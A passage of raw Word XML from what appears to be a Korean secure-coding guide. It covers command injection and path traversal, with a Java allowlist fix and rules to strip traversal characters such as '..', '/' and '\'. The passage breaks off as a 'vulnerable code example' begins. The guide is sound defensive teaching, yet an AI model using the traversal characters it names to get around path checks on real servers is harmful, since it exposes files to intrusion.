              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삭제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설치</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>침투</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>장악이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>목록</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String src = request.getParameter("src");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!src.matches("[a-zA-Z0-9_]+")) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new IllegalArgumentException();</w:t>
            </w:r>
            <w:r w:rsidR="00F24D80">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> //</w:t>
            </w:r>
            <w:r w:rsidR="00F24D80">
              <w:rPr>
                <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리중단</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>특정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>동작만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowed = Arrays.asList("search", "export");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!allowed.contains(src)) throw new IllegalArgumentException();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="005130AB" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경로</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>조작</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자원</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00E02863">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버</w:t>
      </w:r>
      <w:r w:rsidR="00E02863">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시스템</w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일경로에</w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005130AB">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부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입력값을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파일명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경로에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사용할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경우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경로순회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문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(/, \, .. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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반드시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제거한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일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경로는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사전에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정의된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안전한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디렉터리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내로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제한한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
